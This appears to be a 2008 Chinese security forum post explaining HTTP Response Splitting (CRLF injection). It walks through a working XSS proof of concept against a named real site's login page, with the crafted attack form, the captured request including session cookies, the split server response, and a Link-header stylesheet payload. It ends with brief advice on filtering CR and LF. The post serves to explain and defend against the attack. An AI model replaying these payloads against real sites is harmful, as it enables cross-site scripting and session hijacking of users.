@@ -1,0 +1,145 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+老树开新花，再看 HTTP Response Splitting 攻击
+D8888D主贴内容-------------------------------------------------------
+作者：刺
+
+为了讲清楚这个问题，首先我们来看一个校内网的XSS。
+
+漏洞出在 [url=http://login.xiaonei.com]链接标记http://login.xiaonei.com[/url]
+
+正常情况下，用户名处是已经htmlencode过了的
+[attach]449[/attach]
+(实际上 a<script>这里是 htmlencode过的)
+接下来随便在什么站上构造如下form： <form id="x" action="http://login.xiaonei.com/Login.do?email=a%0d%0a%0d%0a<script>alert(/XSS/);</script>" method="post">
+
+<!-- input name="email" value="" / -->
+
+<input name="password" value="testtest" />
+
+<input name="origURL" value="http%3A%2F%2Fwww.xiaonei.com%2FSysHome.do%0d%0a" />
+
+<input name="formName" value="" />
+
+<input name="method" value="" />
+
+<input type="submit" value="%E7%99%BB%E5%BD%95" />
+
+</form>
+复制代码提交该表单
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0812/20081218_864d42a3aa12eeb49d90pdKn9yyscjvt.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NDUwfDcwZmQ4YmYxfDEyODY0ODUyODd8MmY0ZmVSMGdoeTM0ZGJDaWpjN3I0QmFnWDhjT3NwTGxsNUxJUGR5ZlpZRGtTeVk%3D&nothumb=yes]链接标记下载[/url] (49.33 KB)
+
+2008-12-18 07:28
+将造成一个XSS
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0812/20081218_8e3aff10481b4f4278a4eyliikRkJu0j.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NDUxfDczYzY2YWZkfDEyODY0ODUyODd8MmY0ZmVSMGdoeTM0ZGJDaWpjN3I0QmFnWDhjT3NwTGxsNUxJUGR5ZlpZRGtTeVk%3D&nothumb=yes]链接标记下载[/url] (12.39 KB)
+
+2008-12-18 07:28
+抓包看到数据是这样构成的POST http://login.xiaonei.com/Login.do?email=a%0d%0a%0d%0a<script>alert(/XSS/);</script> HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-silverlight, */*
+Referer: [url=http://www.a.com/test.html]链接标记http://www.a.com/test.html[/url]
+Accept-Language: zh-cn
+Content-Type: application/x-www-form-urlencoded
+UA-CPU: x86
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)
+Proxy-Connection: Keep-Alive
+Content-Length: 103
+Host: login.xiaonei.com
+Pragma: no-cache
+Cookie: __utmc=204579609; XNESSESSIONID=abcThVKoGZNy6aSjWV54r; _de=axis@ph4nt0m.org; __utma=204579609.2036071383.1229329685.1229336555.1229347798.4; __utmb=204579609; __utmz=204579609.1229336555.3.3.utmccn=(referral)|utmcsr=a.com|utmcct=/test.html|utmcmd=referral; userid=246859805; univid=20001021; gender=1; univyear=0; hostid=246859805; xn_app_histo_246859805=2-3-4-6-7; mop_uniq_ckid=121.0.29.225_1229340478_541890716; syshomeforreg=1; id=246859805; BIGipServerpool_profile=2462586378.20480.0000; _de=a; BIGipServerpool_profile=2462586378.20480.0000
+
+password=testtest&origURL=http%253A%252F%252Fwww.xiaonei.com%252FSysHome.do%250d%250a&formName=&method=[/code]
+
+HTTP/1.1 200 OK
+Server: Resin/3.0.21
+Vary: Accept-Encoding
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Set-Cookie: kl=null; domain=.xiaonei.com; path=/; expires=Thu, 01-Dec-1994 16:00:00 GMT
+Set-Cookie: societyguester=null; domain=.xiaonei.com; path=/; expires=Thu, 01-Dec-1994 16:00:00 GMT
+Set-Cookie: _de=a
+
+<script>alert(/XSS/);</script>; domain=.xiaonei.com; expires=Thu, 10-Dec-2009 13:35:17 GMT
+Set-Cookie: login_email=null; domain=.xiaonei.com; path=/; expires=Thu, 01-Dec-1994 16:00:00 GMT
+Content-Type: text/html;charset=UTF-8
+Connection: close
+Transfer-Encoding: chunked
+Date: Mon, 15 Dec 2008 13:35:17 GMT
+
+217b
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+......
+可以看到，实际上就是分割了http response 包的包头， %0d%0a 是换行，从而插入了我们自己的数据。
+
+HTTP Response Splitting 是 CRLF Injection的一种.
+
+Carriage Return (CR, ASCII 13, \r) Line Feed (LF, ASCII 10, \n)
+
+这两个字符经常被用来作为换行。在很多文本、语言里，都能这么用，所以CRLF是一种广义的攻击，用在HTTP响应里，就是 HTTP Response Splitting
+
+这已经是非常古老的技术了，现在拿出来说，是因为前两天看paper，发现提到IE8 的 XSS Filter没有，也不会(微软已确认)增加 CRLF + XSS 的防范。
+
+所以在这里只能依靠我们自己来对抗这种攻击。
+
+需要指出的是，如果直接用我上面那个form，可能会测试失败，这是因为校内是有压缩过HTTP包的
+
+客户端浏览器（我的是IE7），提交包头里有：
+Accept-Encoding: gzip, deflate
+
+
+所以服务器知道客户端接受压缩包，所以选择了压缩响应包
+Content-Encoding: gzip
+
+这里是采用gzip压缩格式，如果压缩后，直接插入明文的html代码，会报错。
+
+在实施HTTP Response Splitting 的时候，一般通过如下3个条件可以达成这种攻击（当然要没过滤%0d%0a）：
+1. Set-Cookie 中的内容用户可以控制
+
+2. 302跳转的 Location 地址用户可以控制
+
+3. 其他自定义Header 用户可以控制
+
+上面举的校内网的例子就是第一种，在 Set-Cookie 中有个字段可以控制，而又没过滤CR、LF
+
+实际上这里问题还不止如此，提交的参数中有一个 
+<input name="origURL" value="http%3A%2F%2Fwww.xiaonei.com%2FSysHome.do%0d%0a" />
+
+此处将造成一个 302 跳转，满足我们的第二个条件，这里也是可以控制的。
+
+第三个条件，自定义的header，这个不多见，但我也在大站里找到过案例，出于其他因素考虑，不在这里举例了。
+
+
+GZIP的压缩数据很讨厌，导致我们必须要自己去压缩数据，然后想办法提交上去，大大增加了攻击的门槛。但是如果CRLF的时候处在 Content-Encoding: gzip 之前，则可以提交明文数据，反之，则不能直接提交明文数据。
+
+
+比较万能的跨站是直接在HTTP头里插入新标准里的 Link 标签
+
+Link: <[url=http://www.a.com/xss.css]链接标记http://www.a.com/xss.css[/url]>; REL:stylesheet
+
+可以直接造成XSS
+
+
+不光是XSS，HTTP Response Splitting 的严重性要高于XSS，因为能修改HTTP返回包头，所以很可能造成跨域问题。
+
+设想我们插入一个P3P头，然后再在一个别的域引用此处，则会造成隐私数据的跨域.
+
+此类问题非常之多，很多大站都有，不再举例了。漏洞组合起来，威力绝对不止1+1=2这么简单了。
+
+
+要防范很简单，过滤或者替换 %0d%0a 
+
+针对我上面列出的3个条件，检查所有输出。
+
+[  ]
+[url=http://www.t00ls.net/attachment.php?aid=NDUyfDhjNzEwZmZlfDEyODY0ODUyODd8MmY0ZmVSMGdoeTM0ZGJDaWpjN3I0QmFnWDhjT3NwTGxsNUxJUGR5ZlpZRGtTeVk%3D&nothumb=yes]链接标记3.jpg[/url] (66.47 KB) 
+下载次数:1
+2008-12-18 07:28
+
+ [img]http://www.t00ls.net/attachments/month_0812/20081218_9a06b2006fa105068089ib8rFb6b8kWL.jpg[/img]
